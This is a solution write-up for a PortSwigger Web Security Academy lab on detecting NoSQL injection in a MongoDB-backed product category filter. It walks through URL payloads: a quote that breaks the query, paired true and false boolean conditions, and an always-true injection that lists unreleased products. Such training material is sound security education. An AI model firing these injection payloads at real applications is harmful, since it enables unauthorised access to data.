# Detecting NoSQL injection

**Lab Url**: [https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)

## Objective

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

## Solution

The category filter passes user input directly into a MongoDB NoSQL query. We can detect and exploit the injection through boolean logic.

### Step 1: Detect the injection point

Add a single quote to the category value:

```bash
/filter?category=Accessories'
```

A **500 Internal Server Error** confirms broken query syntax and a likely injection point.

### Step 2: Confirm boolean logic

Submit two queries with a false and a true condition:

```bash
/filter?category=Gifts%27%26%26+0+%26%26%27x     →  no results (false)
/filter?category=Gifts%27%26%26+1+%26%26%27x     →  results (true)
```

The difference confirms we can control the query's boolean logic.

### Step 3: Inject an always-true condition

To bypass the category filter and show all products (including unreleased ones), inject a condition that always evaluates to true:

```bash
/filter?category=Accessories%27%7c%7c%27%31%27%3d%3d%27%31
```

Decoded: `Accessories'||'1'=='1`

The application returns all products, solving the lab.
